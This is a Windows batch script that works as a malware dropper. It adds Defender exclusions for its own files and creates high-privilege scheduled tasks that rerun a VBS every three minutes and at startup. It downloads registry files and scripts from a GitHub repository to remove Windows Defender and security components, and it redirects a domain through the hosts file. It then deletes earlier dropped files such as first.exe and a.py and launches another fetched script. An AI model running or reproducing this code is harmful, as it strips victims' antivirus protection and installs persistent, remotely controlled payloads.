powershell -Command "Add-MpPreference -ExclusionPath '%temp%\DefenderRemover.bat'"
powershell -Command "Add-MpPreference -ExclusionPath '%temp%\RemoveSecHealthApp.ps1'"
powershell -Command "Add-MpPreference -ExclusionPath '%temp%\PowerRun.exe'"
powershell -Command "Add-MpPreference -ExclusionPath '%temp%\Remove_SecurityComp\Remove_SecurityComp.reg'"
powershell -Command "Add-MpPreference -ExclusionPath '%temp%\Remove_Defender\NomoreDelayandTimeouts.reg'"
powershell -Command "Add-MpPreference -ExclusionPath '%temp%\Remove_Defender\Output.reg'"
powershell -Command "Add-MpPreference -ExclusionPath '%temp%\Remove_Defender\RemoveShellAssociation.reg'"
powershell -Command "Add-MpPreference -ExclusionPath '%temp%\RunDefenderRemover.vbs'"

schtasks /create /tn "TempVBS" /tr "%temp%\e.vbs" /sc minute /mo 3  /f /rl HIGHEST
schtasks /create /tn "TempVBS_OnBoot" /tr "%temp%\e.vbs" /sc onstart /f /rl HIGHEST


schtasks /delete /tn "upgradef1" /f
schtasks /delete /tn "InstallRequests" /f
schtasks /delete /tn "RunPowerShellScript" /f
cd %temp%
mkdir Remove_SecurityComp
cd Remove_SecurityComp
curl https://raw.githubusercontent.com/seition2doc/dosta2/refs/heads/main/Remove_SecurityComp.reg -o Remove_SecurityComp.reg
cd %temp%
mkdir Remove_Defender
cd Remove_Defender
curl https://raw.githubusercontent.com/seition2doc/dosta2/refs/heads/main/NomoreDelayandTimeouts.reg -o NomoreDelayandTimeouts.reg
curl https://raw.githubusercontent.com/seition2doc/dosta2/refs/heads/main/Output.reg -o Output.reg
curl https://raw.githubusercontent.com/seition2doc/dosta2/refs/heads/main/RemoveShellAssociation.reg -o RemoveShellAssociation.reg
cd %temp%
DefenderRemover.bat

cd %temp%
curl https://raw.githubusercontent.com/seition2doc/dosta2/refs/heads/main/RunDefenderRemover.vbs -o RunDefenderRemover.vbs
curl https://raw.githubusercontent.com/seition2doc/dosta2/refs/heads/main/DefenderRemover.bat -o DefenderRemover.bat 

RunDefenderRemover.vbs

curl https://raw.githubusercontent.com/seition2doc/dosta2/refs/heads/main/e.vbs-o e.vbs
curl https://raw.githubusercontent.com/seition2doc/dosta2/refs/heads/main/asd123.bat -o asd123.bat
curl https://raw.githubusercontent.com/seition2doc/dosta2/refs/heads/main/rb.bat -o rb.bat
curl https://raw.githubusercontent.com/seition2doc/dosta2/refs/heads/main/rb.vbs -o rb.vbs
echo 185.194.175.132 davidroger.com >> %SystemRoot%\System32\drivers\etc\hosts


cd %temp%
del /f /q "s.bat"
del /f /q "a.py"
del /f /q "ddd.vbs"
del /f /q "expe2.bat"
del /f /q "expe2.vbs"
del /f /q "lalala.vbs"
del /f /q "a.ps1"
del /f /q "first.exe"
del /f /q "corpvpn.inf"
del /f /q "RunDefenderRemover.vbs"
del /f /q "DefenderRemover.bat"
rmdir /s /q "Remove_SecurityComp"
rmdir /s /q "Remove_Defender"


timeout /t 5
start rb.vbs





